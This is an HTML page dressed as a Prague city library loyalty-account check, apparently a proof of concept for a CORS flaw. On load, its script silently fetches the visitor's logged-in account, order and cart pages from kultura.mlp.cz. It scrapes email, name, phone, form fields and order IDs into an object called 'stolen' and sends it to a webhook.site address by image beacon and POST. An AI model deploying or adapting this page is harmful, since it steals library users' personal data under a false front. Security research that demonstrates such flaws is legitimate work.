<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="utf-8">
<title>Městská knihovna Praha — Věrnostní program</title>
<style>
body{font-family:Arial,sans-serif;max-width:700px;margin:40px auto;padding:20px;background:#f5f5f5}
.card{background:#fff;border-radius:8px;padding:30px;box-shadow:0 2px 8px rgba(0,0,0,.1);text-align:center}
h1{color:#1a5276}
.spinner{border:4px solid #f3f3f3;border-top:4px solid #1a5276;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.hidden{display:none}
#result{text-align:left;background:#f8f9fa;padding:15px;border-radius:5px;font-family:monospace;font-size:13px;white-space:pre-wrap;margin-top:20px}
.tag{display:inline-block;background:#e74c3c;color:#fff;padding:2px 8px;border-radius:3px;font-size:11px;margin-bottom:10px}
</style>
</head>
<body>
<div class="card">
    <h1>📚 Městská knihovna Praha</h1>
    <p>Ověřování věrnostního účtu...</p>
    <div class="spinner" id="spinner"></div>
    <p id="status">Načítání...</p>
    <div id="result" class="hidden"></div>
</div>

<script>
// ══════════════════════════════════════════════════════════
// KONFIGURÁCIA:
const WEBHOOK = "https://webhook.site/#!/view/542b4ee2-7438-4385-be70-6d56c5ecc3e1";
// ══════════════════════════════════════════════════════════

const T = "https://kultura.mlp.cz";

function ex(html, patterns) {
    for (const p of patterns) {
        const m = html.match(p);
        if (m && m[1] && m[1].trim()) return m[1].trim();
    }
    return "";
}

async function steal() {
    const status = document.getElementById("status");
    const result = document.getElementById("result");
    const spinner = document.getElementById("spinner");

    const stolen = {
        timestamp: new Date().toISOString(),
        origin: window.location.origin,
        data: {}
    };

    try {
        // 1. Registration page
        status.textContent = "Ověřování účtu...";
        const r1 = await fetch(T + "/mkp/General/MyAccount/Registration", {credentials: "include"});
        const h1 = await r1.text();

        // Email — hľadáme v rôznych miestach
        stolen.data.email = ex(h1, [
            /registrationEmail"[^>]*value="([^"]+)"/,
            /name="Email"[^>]*value="([^"]+)"/,
            /value="([^"]*)"[^>]*name="Email"/,
            /value="([^"]*)"[^>]*id="registrationEmail"/,
        ]);

        // Meno — z value alebo z iných patterns
        stolen.data.jmeno = ex(h1, [
            /name="FirstName"[^>]*value="([^"]+)"/,
            /value="([^"]*)"[^>]*name="FirstName"/,
            /inputName"[^>]*value="([^"]+)"/,
            /value="([^"]*)"[^>]*id="inputName"/,
        ]);

        stolen.data.prijmeni = ex(h1, [
            /name="Surname"[^>]*value="([^"]+)"/,
            /value="([^"]*)"[^>]*name="Surname"/,
            /inputSurname"[^>]*value="([^"]+)"/,
            /value="([^"]*)"[^>]*id="inputSurname"/,
        ]);

        stolen.data.telefon = ex(h1, [
            /name="PhoneNumber"[^>]*value="([^"]+)"/,
            /value="([^"]*)"[^>]*name="PhoneNumber"/,
            /inputPhone"[^>]*value="([^"]+)"/,
        ]);

        // Všetky emaily na stránke
        const emails = [...new Set((h1.match(/[\w.-]+@[\w.-]+\.\w{2,}/g) || []))];
        if (!stolen.data.email && emails.length) stolen.data.email = emails[0];
        stolen.data.all_emails = emails;

        // Skúsime nájsť dáta v hidden inputoch a JS
        const allValues = [...h1.matchAll(/name="([^"]+)"[^>]*value="([^"]+)"/g)];
        const allValues2 = [...h1.matchAll(/value="([^"]+)"[^>]*name="([^"]+)"/g)];
        const formData = {};
        allValues.forEach(m => { if(m[2].length > 0 && m[2].length < 100) formData[m[1]] = m[2]; });
        allValues2.forEach(m => { if(m[1].length > 0 && m[1].length < 100) formData[m[2]] = m[1]; });
        stolen.data.all_form_fields = formData;

        // 2. MyAccount — objednávky
        status.textContent = "Načítání objednávek...";
        const r2 = await fetch(T + "/mkp/General/MyAccount?mrsid=1", {credentials: "include"});
        const h2 = await r2.text();

        // Meno z navigácie
        stolen.data.logged_as = ex(h2, [
            /login__user-name[^>]*>\s*([^<]+)/,
            /user-name[^>]*>\s*([^<]+)/,
        ]);

        // Objednávky
        const orders = [...new Set([...h2.matchAll(/orderId[^>]*?(\d+)/g)].map(m => m[1]))];
        stolen.data.order_ids = orders;

        // MLP check authorization data (meno v JS)
        const jmenoJS = ex(h2, [
            /"Jmeno"\s*:\s*"([^"]+)"/,
            /\.Jmeno\s*[=:]\s*"([^"]+)"/,
        ]);
        const prijmeniJS = ex(h2, [
            /"Prijmeni"\s*:\s*"([^"]+)"/,
            /\.Prijmeni\s*[=:]\s*"([^"]+)"/,
        ]);
        const emailJS = ex(h2, [
            /"Email"\s*:\s*"([^"]+)"/,
            /\.Email\s*[=:]\s*"([^"]+)"/,
        ]);
        if (jmenoJS) stolen.data.jmeno = jmenoJS;
        if (prijmeniJS) stolen.data.prijmeni = prijmeniJS;
        if (emailJS && !stolen.data.email) stolen.data.email = emailJS;

        // 3. Košík
        status.textContent = "Načítání košíku...";
        const r3 = await fetch(T + "/mkp/standard/Cart/Index?mrsid=1", {credentials: "include"});
        const h3 = await r3.text();
        const total = h3.match(/value:\s*(\d+)/);
        stolen.data.cart = total ? total[1] + " Kč" : "prázdný";

        // 4. Exfiltrácia na webhook
        if (WEBHOOK && WEBHOOK !== "https://webhook.site/#!/view/542b4ee2-7438-4385-be70-6d56c5ecc3e1") {
            // Image beacon (vždy funguje)
            const p = encodeURIComponent(JSON.stringify(stolen));
            new Image().src = WEBHOOK + "?" + p.substring(0, 2000);
            // Fetch s text/plain (obíde CORS preflight)
            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    body: JSON.stringify(stolen, null, 2),
                    mode: "no-cors"
                });
            } catch(e) {}
            stolen._sent_to_webhook = true;
        }

        // 5. Zobrazenie
        spinner.style.display = "none";
        const hasData = stolen.data.email || stolen.data.logged_as || stolen.data.jmeno;
        status.innerHTML = hasData
            ? '<span style="color:#e74c3c;font-weight:bold">⚠️ Vaše údaje byly přečteny z cizí domény!</span>'
            : '<span style="color:#f39c12">Session anonymní</span>';
        result.classList.remove("hidden");
        result.innerHTML = '<span class="tag">EXFILTROVANÁ DATA</span>\n' + JSON.stringify(stolen, null, 2);

    } catch (e) {
        spinner.style.display = "none";
        status.innerHTML = '✅ CORS zablokován';
        result.classList.remove("hidden");
        result.textContent = "Blocked: " + e.message;
    }
}

window.addEventListener("load", steal);
</script>
</body>
</html>
